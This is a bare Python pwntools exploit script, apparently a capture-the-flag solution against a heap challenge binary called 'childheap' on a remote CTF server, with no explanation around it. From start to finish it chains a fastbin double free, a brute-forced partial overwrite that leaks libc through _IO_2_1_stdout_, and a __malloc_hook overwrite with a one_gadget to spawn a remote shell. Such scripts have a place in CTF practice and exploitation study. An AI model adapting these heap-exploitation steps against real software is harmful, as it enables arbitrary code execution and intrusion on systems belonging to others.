from pwn import *
elf = ELF("./childheap")
#libc = elf.libc
libc = ELF("./libc.so.6")

def malloc(idx, size, content):
    p.sendlineafter("> ", "1")
    p.sendlineafter("index: ", str(idx))
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", content)

def free(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("index: ", str(idx))

if __name__ == "__main__":
    while True:
        #p = process("./childheap")
        p = remote("ctf.j0n9hyun.xyz", 3033)
        malloc(0, 96, p64(0x0) * 3 + p64(0x71))
        malloc(1, 96, p64(0x0) * 5 + p64(0x21) + p64(0x0) + p64(0x31))
        free(0)
        free(1)
        free(0)
        malloc(0, 96, "\x20")
        malloc(1, 96, "\x00")
        malloc(2, 96, "\x00")
        malloc(3, 96, "\x00")
        free(0)
        malloc(2, 96, p64(0x0) * 3 + p64(0x91))
        free(3)
        malloc(3, 96, "\xdd\x85")
        malloc(4, 96, "c" * 8)
        free(0)
        free(4)
        free(0)
        malloc(4, 96, "\x20")
        malloc(4, 96, "\x20")
        malloc(4, 96, "\x00")
        malloc(4, 96, "\x00")
        try: 
            malloc(4, 96, "a" * 3 + p64(0x0) * 6 + p64(0xfbad1800) + "\x00" * 25)
            p.recvuntil("\x7f")
            libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - 131 - libc.symbols['_IO_2_1_stdout_']
            p.success("libc_base : " + hex(libc_base))
            __malloc_hook = libc_base + libc.symbols['__malloc_hook']
            oneshot = libc_base + 0xf02a4
            p.success("__malloc_hook : " + hex(__malloc_hook))
        except:
            p.close()
            continue
        malloc(0, 96, "a" * 8)
        malloc(1, 96, "b" * 8)
        free(0)
        free(1)
        free(0)
        malloc(0, 96, p64(__malloc_hook - 0x23))
        malloc(0, 96, "\x00")
        malloc(0, 96, "\x00")
        malloc(0, 96, "\x00" * 19 + p64(oneshot))
        p.sendline("1")
        p.sendline("0")
        p.sendline("11")
        p.interactive()

